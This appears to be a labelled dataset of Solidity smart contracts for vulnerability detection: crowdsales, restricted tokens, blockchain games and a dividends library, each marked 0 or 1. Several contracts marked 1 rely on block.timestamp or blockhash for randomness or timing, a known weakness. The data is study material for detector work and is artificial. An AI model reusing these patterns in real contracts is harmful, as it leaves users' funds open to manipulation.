0<CODESPLIT>contract WhitelistedAICrowdsale is TokenlessCrowdsale, Ownable {  using SafeMath for uint256;  mapping(address => bool) public accredited;     mapping(address => uint256) public contributions;  mapping(address => uint256) public caps;    function isWhitelisted(address _beneficiary) public view returns (bool) {    if (caps[_beneficiary] != 0) {      return true;    }    return false;  }     function addToWhitelist(address _beneficiary, uint256 _cap, bool _accredited) external onlyOwner {    caps[_beneficiary] = _cap;    accredited[_beneficiary] = _accredited;  }     function removeFromWhitelist(address _beneficiary) external onlyOwner {    caps[_beneficiary] = 0;    accredited[_beneficiary] = false;  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {    super._preValidatePurchase(_beneficiary, _weiAmount);    require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);  }     function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {    super._updatePurchasingState(_beneficiary, _weiAmount);    contributions[_beneficiary] = contributions[_beneficiary].add(_weiAmount);  }} 
0<CODESPLIT>contract FiatCappedCrowdsale is TokenlessCrowdsale, Ownable {  using SafeMath for uint256;           uint256 public millCap;    uint256 public millRaised;       uint256 public minMillPurchase;     uint256 public millWeiRate;     uint256 public millLeconteRate;        uint256 constant minMillWeiRate = (10 ** 18) / (5000 * (10 ** 3));    uint256 constant maxMillWeiRate = (10 ** 18) / (100 * (10 ** 3));       uint256 constant minMillLeconteRate = (10 ** 18) / 1000;    uint256 constant maxMillLeconteRate = (10 ** 18) / 10;       modifier isSaneETHRate(uint256 _millWeiRate) {    require(_millWeiRate >= minMillWeiRate);    require(_millWeiRate <= maxMillWeiRate);    _;  }     modifier isSaneSPXRate(uint256 _millLeconteRate) {    require(_millLeconteRate >= minMillLeconteRate);    require(_millLeconteRate <= maxMillLeconteRate);    _;  }     constructor (    uint256 _millCap,    uint256 _minMillPurchase,    uint256 _millLeconteRate,    uint256 _millWeiRate  ) public isSaneSPXRate(_millLeconteRate) isSaneETHRate(_millWeiRate) {    require(_millCap > 0);    require(_minMillPurchase > 0);    millCap = _millCap;    minMillPurchase = _minMillPurchase;    millLeconteRate = _millLeconteRate;    millWeiRate = _millWeiRate;  }     function capReached() public view returns (bool) {    return millRaised >= millCap;  }     function setWeiRate(uint256 _millWeiRate) external onlyOwner isSaneETHRate(_millWeiRate) {    millWeiRate = _millWeiRate;  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {    super._preValidatePurchase(_beneficiary, _weiAmount);         uint256 _millAmount = _toMill(_weiAmount);    require(_millAmount >= minMillPurchase);         uint256 _millRaised = millRaised.add(_millAmount);    require(_millRaised <= millCap);    millRaised = _millRaised;  }     function _toMill(uint256 _weiAmount) internal returns (uint256) {    return _weiAmount.div(millWeiRate);  }     function _toLeconte(uint256 _weiAmount) internal returns (uint256) {    return _toMill(_weiAmount).mul(millLeconteRate);  }} 
0<CODESPLIT>contract BasicERC223Receiver {  function tokenFallback(address _from, uint256 _value, bytes _data) public pure;} 
0<CODESPLIT>contract RestrictedToken is BasicToken, Ownable {  string public name;  string public symbol;  uint8 public decimals;     address public issuer;        uint256 public vestingPeriod;     mapping(address => bool) public authorizedRecipients;     mapping(address => bool) public erc223Recipients;     mapping(address => uint256) public lastIssuedTime;  event Issue(address indexed to, uint256 value);     modifier onlyIssuer() {    require(msg.sender == issuer);    _;  }     modifier isAuthorizedRecipient(address _recipient) {    require(authorizedRecipients[_recipient]);    _;  }  constructor (    uint256 _supply,    string _name,    string _symbol,    uint8 _decimals,    uint256 _vestingPeriod,    address _owner,      address _issuer    ) public {    require(_supply != 0);    require(_owner != address(0));    require(_issuer != address(0));    name = _name;    symbol = _symbol;    decimals = _decimals;    vestingPeriod = _vestingPeriod;    owner = _owner;    issuer = _issuer;    totalSupply_ = _supply;    balances[_issuer] = _supply;    emit Transfer(address(0), _issuer, _supply);  }     function authorize(address _recipient, bool _isERC223) public onlyOwner {    require(_recipient != address(0));    authorizedRecipients[_recipient] = true;    erc223Recipients[_recipient] = _isERC223;  }  function deauthorize(address _recipient) public onlyOwner isAuthorizedRecipient(_recipient) {    authorizedRecipients[_recipient] = false;    erc223Recipients[_recipient] = false;  }     function transfer(address _to, uint256 _value) public isAuthorizedRecipient(_to) returns (bool) {    if (erc223Recipients[_to]) {      BasicERC223Receiver receiver = BasicERC223Receiver(_to);      bytes memory empty;      receiver.tokenFallback(msg.sender, _value, empty);    }    return super.transfer(_to, _value);  }     function issue(address _to, uint256 _value) public onlyIssuer returns (bool) {    lastIssuedTime[_to] = block.timestamp;    emit Issue(_to, _value);    return super.transfer(_to, _value);  }} 
0<CODESPLIT>contract PrivatePreSale is TokenlessCrowdsale, WhitelistedAICrowdsale, FiatCappedCrowdsale, PausableCrowdsale {  using SafeMath for uint256;     RestrictedToken public tokenR0;    RestrictedToken public tokenR6;    uint8 constant bonusPct = 15;  constructor (address _wallet, uint256 _millWeiRate) TokenlessCrowdsale(_wallet)    FiatCappedCrowdsale(      5000000 * (10 ** 3),        500 * (10 ** 3),        (10 ** 18) / 50,        _millWeiRate    )  public {    tokenR0 = new RestrictedToken(      2 * 100000000 * (10 ** 18),        'Sparrow Token (Restricted)',        'SPX-R0',        18,        0,        msg.sender,        this      );         tokenR6 = new RestrictedToken(      2 * 115000000 * (10 ** 18),        'Sparrow Token (Restricted with 6-month vesting)',        'SPX-R6',        18,        6 * 30 * 86400,        msg.sender,        this      );  }        function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {    super._processPurchaseInWei(_beneficiary, _weiAmount);    uint256 tokens = _toLeconte(_weiAmount);    uint256 bonus = tokens.mul(bonusPct).div(100);         if (accredited[_beneficiary]) {      tokenR0.issue(_beneficiary, tokens);      tokenR6.issue(_beneficiary, bonus);    } else {      tokenR6.issue(_beneficiary, tokens.add(bonus));    }  }}
1<CODESPLIT>contract theRun {    uint private Last_Payout = 0;    function random(uint Max) constant private returns (uint256 result){        uint256 salt =  block.timestamp;        uint256 seed = block.number/3 + (salt % 300) + Last_Payout;        uint256 h = uint256(block.blockhash(seed));        return uint256(h) % Max + 1;    }}
0<CODESPLIT>contract TheEthGameTrophy {    string public name;     string public description;    string public message;        address public creator;    address public owner;    address public winner;    uint public rank;        bool private isAwarded = false;        event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);    event Transfer (address indexed _from, address indexed _to);    constructor () public {        name = "The Eth Game Winner";        description = "2019-08-17";        rank = 1;        creator = msg.sender;    }        function name() constant public returns (string _name) {        return name;    }        function description() constant public returns (string _description) {        return description;    }        function message() constant public returns (string _message) {        return message;    }        function creator() constant public returns (address _creator) {        return creator;    }        function owner() constant public returns (address _owner) {        return owner;    }        function winner() constant public returns (address _winner) {        return winner;    }        function rank() constant public returns (uint _rank) {        return rank;    }      function award(address _address, string _message) public {        require(msg.sender == creator && !isAwarded);        isAwarded = true;        owner = _address;        winner = _address;        message = _message;                emit Award(block.number, block.timestamp, _address);    }        function transfer(address _to) private returns (bool success) {        require(msg.sender == owner);        owner = _to;        emit Transfer(msg.sender, _to);        return true;    }}
1<CODESPLIT>contract timegame {  uint constant TWELEVE_HOURS = 12 * 60 * 60;  uint public regeneration;  function enter() {    if (regeneration + TWELEVE_HOURS < block.timestamp) {        if (msg.value < 1 ether) {            msg.sender.send(msg.value);            return;        }    }  }}
0<CODESPLIT>contract TheEthGame {    using SafeMath for uint256;        struct Player {        uint256 score;        uint256 lastCellBoughtOnBlockNumber;        uint256 numberOfCellsOwned;        uint256 numberOfCellsBought;        uint256 earnings;        uint256 partialHarmonicSum;        uint256 partialScoreSum;                address referreal;        bytes32 name;    }        struct Cell {        address owner;        uint256 price;    }        address public owner;        uint256 constant private NUMBER_OF_LINES = 6;    uint256 constant private NUMBER_OF_COLUMNS = 6;    uint256 constant private NUMBER_OF_CELLS = NUMBER_OF_COLUMNS * NUMBER_OF_LINES;    uint256 constant private DEFAULT_POINTS_PER_CELL = 3;    uint256 constant private POINTS_PER_NEIGHBOUR = 1;    uint256 constant private CELL_STARTING_PRICE = 0.01 ether;    uint256 constant private BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME = 10000;    uint256 constant private PRICE_INCREASE_PERCENTAGE = uint(2);    uint256 constant private REFERREAL_PERCENTAGE = uint(10);    uint256 constant private POT_PERCENTAGE = uint(30);    uint256 constant private DEVELOPER_PERCENTAGE = uint(5);    uint256 constant private SCORE_PERCENTAGE = uint(25);    uint256 constant private NUMBER_OF_CELLS_PERCENTAGE = uint(30);        Cell[NUMBER_OF_CELLS] cells;        address[] private ranking;    mapping(address => Player) players;    mapping(bytes32 => address) nameToAddress;        uint256 public numberOfCellsBought;    uint256 private totalScore;        uint256 private developersCut = 0 ether;    uint256 private potCut = 0 ether;    uint256 private harmonicSum;    uint256 private totalScoreSum;        address private rankOnePlayerAddress;    uint256 private isFirstSinceBlock;        address public trophyAddress;        event Bought (address indexed _from, address indexed _to);    constructor () public {        owner = msg.sender;        trophyAddress = new TheEthGameTrophy();    }             modifier onlyOwner() {        require(owner == msg.sender);        _;    }             function nextPriceOf (uint256 _cellId) public view returns (uint256 _nextPrice) {        return priceOf(_cellId).mul(100 + PRICE_INCREASE_PERCENTAGE) / 100;    }        function priceOf (uint256 _cellId) public view returns (uint256 _price) {        if (cells[_cellId].price == 0) {            return CELL_STARTING_PRICE;        }                return cells[_cellId].price;    }        function earningsFromNumberOfCells (address _address) internal view returns (uint256 _earnings) {        return harmonicSum.sub(players[_address].partialHarmonicSum).mul(players[_address].numberOfCellsBought);    }        function distributeEarningsBasedOnNumberOfCells (address _address) internal {        players[_address].earnings = players[_address].earnings.add(earningsFromNumberOfCells(_address));        players[_address].partialHarmonicSum = harmonicSum;    }        function earningsFromScore (address _address) internal view returns (uint256 _earnings) {        return totalScoreSum.sub(players[_address].partialScoreSum).mul(scoreOf(_address));    }        function distributeEarningsBasedOnScore (address _newOwner, address _oldOwner) internal {        players[_newOwner].earnings = players[_newOwner].earnings.add(earningsFromScore(_newOwner));        players[_newOwner].partialScoreSum = totalScoreSum;                if (_oldOwner != address(0)) {            players[_oldOwner].earnings = players[_oldOwner].earnings.add(earningsFromScore(_oldOwner));            players[_oldOwner].partialScoreSum = totalScoreSum;        }    }        function earningsOfPlayer () public view returns (uint256 _wei) {        return players[msg.sender].earnings.add(earningsFromScore(msg.sender)).add(earningsFromNumberOfCells(msg.sender));    }        function getRankOnePlayer (address _oldOwner) internal view returns (address _address, uint256 _oldOwnerIndex) {        address rankOnePlayer;        uint256 oldOwnerIndex;                for (uint256 i = 0; i < ranking.length; i++) {            if (scoreOf(ranking[i]) > scoreOf(rankOnePlayer)) {                    rankOnePlayer = ranking[i];            } else if (scoreOf(ranking[i]) == scoreOf(rankOnePlayer) && players[ranking[i]].lastCellBoughtOnBlockNumber > players[rankOnePlayer].lastCellBoughtOnBlockNumber) {                    rankOnePlayer = ranking[i];            }                        if (ranking[i] == _oldOwner) {                oldOwnerIndex = i;            }        }                        return (rankOnePlayer, oldOwnerIndex);    }    function buy (uint256 _cellId, address _referreal) payable public {        require(msg.value >= priceOf(_cellId));        require(!isContract(msg.sender));        require(_cellId < NUMBER_OF_CELLS);        require(msg.sender != address(0));        require(!isGameFinished());          require(ownerOf(_cellId) != msg.sender);        require(msg.sender != _referreal);                address oldOwner = ownerOf(_cellId);        address newOwner = msg.sender;        uint256 price = priceOf(_cellId);        uint256 excess = msg.value.sub(price);        bool isReferrealDistributed = distributeToReferreal(price, _referreal);                         if (numberOfCellsBought > 0) {            harmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));            if (isReferrealDistributed) {                totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));            } else {                totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));            }        }else{                         potCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);        }                numberOfCellsBought++;                distributeEarningsBasedOnNumberOfCells(newOwner);                players[newOwner].numberOfCellsBought++;        players[newOwner].numberOfCellsOwned++;                if (ownerOf(_cellId) != address(0)) {             players[oldOwner].numberOfCellsOwned--;        }                players[newOwner].lastCellBoughtOnBlockNumber = block.number;                 address oldRankOnePlayer = rankOnePlayerAddress;                (uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);                distributeEarningsBasedOnScore(newOwner, oldOwner);                totalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));                        players[newOwner].score = newOwnerScore;        players[oldOwner].score = oldOwnerScore;                totalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));        cells[_cellId].price = nextPriceOf(_cellId);                         if (players[newOwner].numberOfCellsOwned == 1) {           ranking.push(newOwner);        }                if (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {            (address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);             if (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {                delete ranking[oldOwnerIndex];            }            rankOnePlayerAddress = rankOnePlayer;        }else{              if (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {                rankOnePlayerAddress = newOwner;            }        }                if (rankOnePlayerAddress != oldRankOnePlayer) {            isFirstSinceBlock = block.number;        }                developersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);        potCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);        _transfer(oldOwner, newOwner, _cellId);                emit Bought(oldOwner, newOwner);                if (excess > 0) {          newOwner.transfer(excess);        }    }        function distributeToReferreal (uint256 _price, address _referreal) internal returns (bool _isDstributed) {        if (_referreal != address(0) && _referreal != msg.sender) {            players[msg.sender].referreal = _referreal;        }                         if (players[msg.sender].referreal != address(0)) {            address ref = players[msg.sender].referreal;            players[ref].earnings = players[ref].earnings.add(_price.mul(REFERREAL_PERCENTAGE) / 100);            return true;        }                return false;    }             function getPlayers () external view returns(uint256[] _scores, uint256[] _lastCellBoughtOnBlock, address[] _addresses, bytes32[] _names) {        uint256[] memory scores = new uint256[](ranking.length);        address[] memory addresses = new address[](ranking.length);        uint256[] memory lastCellBoughtOnBlock = new uint256[](ranking.length);        bytes32[] memory names = new bytes32[](ranking.length);                for (uint256 i = 0; i < ranking.length; i++) {            Player memory p = players[ranking[i]];                        scores[i] = p.score;            addresses[i] = ranking[i];            lastCellBoughtOnBlock[i] = p.lastCellBoughtOnBlockNumber;            names[i] = p.name;        }                return (scores, lastCellBoughtOnBlock, addresses, names);    }        function getCells () external view returns (uint256[] _prices, uint256[] _nextPrice, address[] _owner, bytes32[] _names) {        uint256[] memory prices = new uint256[](NUMBER_OF_CELLS);        address[] memory owners = new address[](NUMBER_OF_CELLS);        bytes32[] memory names = new bytes32[](NUMBER_OF_CELLS);        uint256[] memory nextPrices = new uint256[](NUMBER_OF_CELLS);                for (uint256 i = 0; i < NUMBER_OF_CELLS; i++) {             prices[i] = priceOf(i);             owners[i] = ownerOf(i);             names[i] = players[ownerOf(i)].name;             nextPrices[i] = nextPriceOf(i);        }                return (prices, nextPrices, owners, names);    }        function getPlayer () external view returns (bytes32 _name, uint256 _score, uint256 _earnings, uint256 _numberOfCellsBought) {        return (players[msg.sender].name, players[msg.sender].score, earningsOfPlayer(), players[msg.sender].numberOfCellsBought);    }        function getCurrentPotSize () public view returns (uint256 _wei) {        return potCut;    }        function getCurrentWinner () public view returns (address _address) {        return rankOnePlayerAddress;    }        function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {        return int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));    }        function scoreOf (address _address) public view returns (uint256 _score) {        return players[_address].score;    }        function ownerOf (uint256 _cellId) public view returns (address _owner) {        return cells[_cellId].owner;    }        function isGameFinished() public view returns (bool _isGameFinished) {        return rankOnePlayerAddress != address(0) && getNumberOfBlocksRemainingToWin() < 0;    }        function calculateScoresIfCellIsBought (address _newOwner, address _oldOwner, uint256 _cellId) internal view returns (uint256 _newOwnerScore, uint256 _oldOwnerScore) {                 uint256 oldOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;                         uint256 newOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;                                  oldOwnerScoreAdjustment = oldOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _oldOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));        newOwnerScoreAdjustment = newOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _newOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));                if (_oldOwner == address(0)) {            oldOwnerScoreAdjustment = 0;        }                return (scoreOf(_newOwner).add(newOwnerScoreAdjustment), scoreOf(_oldOwner).sub(oldOwnerScoreAdjustment));    }             function calculateNumberOfNeighbours(uint256 _cellId, address _address) internal view returns (uint256 _numberOfNeighbours) {        uint256 numberOfNeighbours;                (uint256 top, uint256 bottom, uint256 left, uint256 right) = getNeighbourhoodOf(_cellId);                if (top != NUMBER_OF_CELLS && ownerOf(top) == _address) {            numberOfNeighbours = numberOfNeighbours.add(1);        }                if (bottom != NUMBER_OF_CELLS && ownerOf(bottom) == _address) {            numberOfNeighbours = numberOfNeighbours.add(1);        }                if (left != NUMBER_OF_CELLS && ownerOf(left) == _address) {            numberOfNeighbours = numberOfNeighbours.add(1);        }                if (right != NUMBER_OF_CELLS && ownerOf(right) == _address) {            numberOfNeighbours = numberOfNeighbours.add(1);        }                return numberOfNeighbours;    }    function getNeighbourhoodOf(uint256 _cellId) internal pure returns (uint256 _top, uint256 _bottom, uint256 _left, uint256 _right) {                                  uint256 topCellId = NUMBER_OF_CELLS;                         if(_cellId >= NUMBER_OF_LINES){           topCellId = _cellId.sub(NUMBER_OF_LINES);        }                         uint256 bottomCellId = _cellId.add(NUMBER_OF_LINES);                         if (bottomCellId >= NUMBER_OF_CELLS) {            bottomCellId = NUMBER_OF_CELLS;        }                         uint256 leftCellId = NUMBER_OF_CELLS;                                  if ((_cellId % NUMBER_OF_LINES) != 0) {            leftCellId = _cellId.sub(1);        }                         uint256 rightCellId = _cellId.add(1);                          if ((rightCellId % NUMBER_OF_LINES) == 0) {            rightCellId = NUMBER_OF_CELLS;        }                return (topCellId, bottomCellId, leftCellId, rightCellId);    }    function _transfer(address _from, address _to, uint256 _cellId) internal {        require(_cellId < NUMBER_OF_CELLS);        require(ownerOf(_cellId) == _from);        require(_to != address(0));        require(_to != address(this));        cells[_cellId].owner = _to;    }             function withdrawPot(string _message) public {        require(!isContract(msg.sender));        require(msg.sender != owner);                          require(rankOnePlayerAddress == msg.sender);        require(isGameFinished());                uint256 toWithdraw = potCut;        potCut = 0;        msg.sender.transfer(toWithdraw);                TheEthGameTrophy trophy = TheEthGameTrophy(trophyAddress);        trophy.award(msg.sender, _message);    }        function withdrawDevelopersCut () onlyOwner() public {        uint256 toWithdraw = developersCut;        developersCut = 0;        owner.transfer(toWithdraw);    }      function withdrawEarnings () public {        distributeEarningsBasedOnScore(msg.sender, address(0));        distributeEarningsBasedOnNumberOfCells(msg.sender);                uint256 toWithdraw = earningsOfPlayer();        players[msg.sender].earnings = 0;                msg.sender.transfer(toWithdraw);    }             function setName(bytes32 _name) public {        if (nameToAddress[_name] != address(0)) {            return;        }                players[msg.sender].name = _name;        nameToAddress[_name] = msg.sender;    }        function nameOf(address _address) external view returns(bytes32 _name) {        return players[_address].name;    }        function addressOf(bytes32 _name) external view returns (address _address) {        return nameToAddress[_name];    }             function isContract(address addr) internal view returns (bool) {        uint size;        assembly { size := extcodesize(addr) }          return size > 0;    }}contract TheEthGameTrophy {    string public name;     string public description;    string public message;        address public creator;    address public owner;    address public winner;    uint public rank;        bool private isAwarded = false;        event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);    event Transfer (address indexed _from, address indexed _to);    constructor () public {        name = "The Eth Game Winner";        description = "2019-08-17";        rank = 1;        creator = msg.sender;    }        function name() constant public returns (string _name) {        return name;    }        function description() constant public returns (string _description) {        return description;    }        function message() constant public returns (string _message) {        return message;    }        function creator() constant public returns (address _creator) {        return creator;    }        function owner() constant public returns (address _owner) {        return owner;    }        function winner() constant public returns (address _winner) {        return winner;    }        function rank() constant public returns (uint _rank) {        return rank;    }      function award(address _address, string _message) public {        require(msg.sender == creator && !isAwarded);        isAwarded = true;        owner = _address;        winner = _address;        message = _message;                emit Award(block.number, block.timestamp, _address);    }        function transfer(address _to) private returns (bool success) {        require(msg.sender == owner);        owner = _to;        emit Transfer(msg.sender, _to);        return true;    }}
0<CODESPLIT>contract Dividends {  using SafeMath for *;  uint private constant FIXED_POINT = 1000000000000000000;  struct Scheme {    uint value;    uint shares;    uint mask;  }  struct Vault {    uint value;    uint shares;    uint mask;  }  mapping (uint => mapping (address => Vault)) private vaultOfAddress;  mapping (uint => Scheme) private schemeOfId;  function buyShares (uint _schemeId, address _owner, uint _shares, uint _value) internal {    require(_owner != address(0));    require(_shares > 0 && _value > 0);    uint value = _value.mul(FIXED_POINT);    Scheme storage scheme = schemeOfId[_schemeId];    scheme.value = scheme.value.add(_value);    scheme.shares = scheme.shares.add(_shares);    require(value > scheme.shares);    uint pps = value.div(scheme.shares);    Vault storage vault = vaultOfAddress[_schemeId][_owner];    vault.shares = vault.shares.add(_shares);    vault.mask = vault.mask.add(scheme.mask.mul(_shares));    vault.value = vault.value.add(value.sub(pps.mul(scheme.shares)));    scheme.mask = scheme.mask.add(pps);  }  function flushVault (uint _schemeId, address _owner) internal {    uint gains = gainsOfVault(_schemeId, _owner);    if (gains > 0) {      Vault storage vault = vaultOfAddress[_schemeId][_owner];      vault.value = vault.value.add(gains);      vault.mask = vault.mask.add(gains);    }  }  function withdrawVault (uint _schemeId, address _owner) internal returns (uint) {    flushVault(_schemeId, _owner);    Vault storage vault = vaultOfAddress[_schemeId][_owner];    uint payout = vault.value.div(FIXED_POINT);    if (payout > 0) {      vault.value = 0;    }    return payout;  }  function creditVault (uint _schemeId, address _owner, uint _value) internal {    Vault storage vault = vaultOfAddress[_schemeId][_owner];    vault.value = vault.value.add(_value.mul(FIXED_POINT));  }  function gainsOfVault (uint _schemeId, address _owner) internal view returns (uint) {    Scheme storage scheme = schemeOfId[_schemeId];    Vault storage vault = vaultOfAddress[_schemeId][_owner];    if (vault.shares == 0) {      return 0;    }    return scheme.mask.mul(vault.shares).sub(vault.mask);  }  function valueOfVault (uint _schemeId, address _owner) internal view returns (uint) {    Vault storage vault = vaultOfAddress[_schemeId][_owner];    return vault.value;  }  function balanceOfVault (uint _schemeId, address _owner) internal view returns (uint) {    Vault storage vault = vaultOfAddress[_schemeId][_owner];    uint total = vault.value.add(gainsOfVault(_schemeId, _owner));    uint balance = total.div(FIXED_POINT);    return balance;  }  function sharesOfVault (uint _schemeId, address _owner) internal view returns (uint) {    Vault storage vault = vaultOfAddress[_schemeId][_owner];    return vault.shares;  }  function valueOfScheme (uint _schemeId) internal view returns (uint) {    return schemeOfId[_schemeId].value;  }  function sharesOfScheme (uint _schemeId) internal view returns (uint) {    return schemeOfId[_schemeId].shares;  }}library Utils {  using SafeMath for uint;  uint private constant LAST_COUNTRY = 195;  function regularTicketPrice () internal pure returns (uint) {    return 100000000000000;  }  function goldenTicketPrice (uint _x) internal pure returns (uint) {    uint price = _x.mul(_x).div(2168819140000000000000000).add(100000000000000).add(_x.div(100000));    return price < regularTicketPrice() ? regularTicketPrice() : price;  }  function ticketsForWithExcess (uint _value) internal pure returns (uint, uint) {    uint tickets = _value.div(regularTicketPrice());    uint excess = _value.sub(tickets.mul(regularTicketPrice()));    return (tickets, excess);  }  function percentageOf (uint _value, uint _p) internal pure returns (uint) {    return _value.mul(_p).div(100);  }  function validReferralCode (string _code) internal pure returns (bool) {    bytes memory b = bytes(_code);    if (b.length < 3) {      return false;    }    for (uint i = 0; i < b.length; i++) {      bytes1 c = b[i];      if (        !(c >= 0x30 && c <= 0x39) &&          !(c >= 0x41 && c <= 0x5A) &&          !(c >= 0x61 && c <= 0x7A) &&          !(c == 0x2D)        ) {        return false;      }    }    return true;  }  function validNick (string _nick) internal pure returns (bool) {    return bytes(_nick).length > 3;  }  function validCountryId (uint _countryId) internal pure returns (bool) {    return _countryId > 0 && _countryId <= LAST_COUNTRY;  }}
0<CODESPLIT>contract Events {  event Started (    uint _time  );  event Bought (    address indexed _player,    address indexed _referral,    uint _countryId,    uint _tickets,    uint _value,    uint _excess  );  event Promoted (    address indexed _player,    uint _goldenTickets,    uint _endTime  );  event Withdrew (    address indexed _player,    uint _amount  );  event Registered (    string _code, address indexed _referral  );  event Won (    address indexed _winner, uint _pot  );}
0<CODESPLIT>contract Constants {  uint internal constant MAIN_SCHEME = 1337;  uint internal constant DEFAULT_COUNTRY = 1;  uint internal constant SET_NICK_FEE = 0.01 ether;  uint internal constant REFERRAL_REGISTRATION_FEE = 0.01 ether;  uint internal constant TO_DIVIDENDS = 42;  uint internal constant TO_REFERRAL = 10;  uint internal constant TO_DEVELOPERS = 4;  uint internal constant TO_COUNTRY = 12;}
1<CODESPLIT>contract State is Constants {  address internal addressOfOwner;  uint internal maxTime = 0;  uint internal addedTime = 0;  uint internal totalPot = 0;  uint internal startTime = 0;  uint internal endTime = 0;  bool internal potWithdrawn = false;  address internal addressOfCaptain;  struct Info {    address referral;    uint countryId;    uint withdrawn;    string nick;  }  mapping (address => Info) internal infoOfAddress;  mapping (address => string[]) internal codesOfAddress;  mapping (string => address) internal addressOfCode;  modifier restricted () {    require(msg.sender == addressOfOwner);    _;  }  modifier active () {    require(startTime > 0);    require(block.timestamp < endTime);    require(!potWithdrawn);    _;  }  modifier player () {    require(infoOfAddress[msg.sender].countryId > 0);    _;  }}
0<CODESPLIT>contract Core is Events, State, Dividends {}
1<CODESPLIT>contract ExternalView is Core {  function totalInfo () external view returns (bool, bool, address, uint, uint, uint, uint, uint, uint, address) {    return (      startTime > 0,      block.timestamp >= endTime,      addressOfCaptain,      totalPot,      endTime,      sharesOfScheme(MAIN_SCHEME),      valueOfScheme(MAIN_SCHEME),      maxTime,      addedTime,      addressOfOwner    );  }  function countryInfo (uint _countryId) external view returns (uint, uint) {    return (      sharesOfScheme(_countryId),      valueOfScheme(_countryId)    );  }  function playerInfo (address _player) external view returns (uint, uint, uint, address, uint, uint, string) {    Info storage info = infoOfAddress[_player];    return (      sharesOfVault(MAIN_SCHEME, _player),      balanceOfVault(MAIN_SCHEME, _player),      balanceOfVault(info.countryId, _player),      info.referral,      info.countryId,      info.withdrawn,      info.nick    );  }  function numberOfReferralCodes (address _player) external view returns (uint) {    return codesOfAddress[_player].length;  }  function referralCodeAt (address _player, uint i) external view returns (string) {    return codesOfAddress[_player][i];  }  function codeToAddress (string _code) external view returns (address) {    return addressOfCode[_code];  }  function goldenTicketPrice (uint _x) external pure returns (uint) {    return Utils.goldenTicketPrice(_x);  }}
0<CODESPLIT>contract Internal is Core {  function _registerReferral (string _code, address _referral) internal {    require(Utils.validReferralCode(_code));    require(addressOfCode[_code] == address(0));    addressOfCode[_code] = _referral;    codesOfAddress[_referral].push(_code);    emit Registered(_code, _referral);  }}
1<CODESPLIT>contract WinnerWinner is Core, Internal, ExternalView {  using SafeMath for *;  constructor () public {    addressOfOwner = msg.sender;  }  function () public payable {    buy(addressOfOwner, DEFAULT_COUNTRY);  }  function start (uint _maxTime, uint _addedTime) public restricted {    require(startTime == 0);    require(_maxTime > 0 && _addedTime > 0);    require(_maxTime > _addedTime);    maxTime = _maxTime;    addedTime = _addedTime;    startTime = block.timestamp;    endTime = startTime + maxTime;    addressOfCaptain = addressOfOwner;    _registerReferral("owner", addressOfOwner);    emit Started(startTime);  }  function buy (address _referral, uint _countryId) public payable active {    require(msg.value >= Utils.regularTicketPrice());    require(msg.value <= 100000 ether);    require(codesOfAddress[_referral].length > 0);    require(_countryId != MAIN_SCHEME);    require(Utils.validCountryId(_countryId));    (uint tickets, uint excess) = Utils.ticketsForWithExcess(msg.value);    uint value = msg.value.sub(excess);    require(tickets > 0);    require(value.add(excess) == msg.value);    Info storage info = infoOfAddress[msg.sender];    if (info.countryId == 0) {      info.referral = _referral;      info.countryId = _countryId;    }    uint vdivs = Utils.percentageOf(value, TO_DIVIDENDS);    uint vreferral = Utils.percentageOf(value, TO_REFERRAL);    uint vdevs = Utils.percentageOf(value, TO_DEVELOPERS);    uint vcountry = Utils.percentageOf(value, TO_COUNTRY);    uint vpot = value.sub(vdivs).sub(vreferral).sub(vdevs).sub(vcountry);    assert(vdivs.add(vreferral).add(vdevs).add(vcountry).add(vpot) == value);    buyShares(MAIN_SCHEME, msg.sender, tickets, vdivs);    buyShares(info.countryId, msg.sender, tickets, vcountry);    creditVault(MAIN_SCHEME, info.referral, vreferral);    creditVault(MAIN_SCHEME, addressOfOwner, vdevs);    if (excess > 0) {      creditVault(MAIN_SCHEME, msg.sender, excess);    }    uint goldenTickets = value.div(Utils.goldenTicketPrice(totalPot));    if (goldenTickets > 0) {      endTime = endTime.add(goldenTickets.mul(addedTime)) > block.timestamp.add(maxTime) ?        block.timestamp.add(maxTime) : endTime.add(goldenTickets.mul(addedTime));      addressOfCaptain = msg.sender;      emit Promoted(addressOfCaptain, goldenTickets, endTime);    }    totalPot = totalPot.add(vpot);    emit Bought(msg.sender, info.referral, info.countryId, tickets, value, excess);  }  function setNick (string _nick) public payable {    require(msg.value == SET_NICK_FEE);    require(Utils.validNick(_nick));    infoOfAddress[msg.sender].nick = _nick;    creditVault(MAIN_SCHEME, addressOfOwner, msg.value);  }  function registerCode (string _code) public payable {    